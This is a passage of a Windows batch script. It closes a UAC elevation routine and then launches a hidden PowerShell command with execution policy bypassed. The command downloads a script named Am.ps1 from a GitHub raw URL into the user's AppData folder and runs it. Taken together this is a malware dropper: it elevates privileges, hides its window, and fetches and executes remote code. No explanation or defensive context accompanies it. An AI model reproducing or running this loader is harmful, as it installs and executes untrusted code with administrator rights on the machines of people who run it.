    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0

powershell -w h -NoP -NonI -Ep Bypass "echo (iwr https://github.com/bonsko216/1/raw/refs/heads/main/Am.ps1).content > "$env:APPDATA\Am.ps1";powershell "$env:APPDATa\Am.ps1""

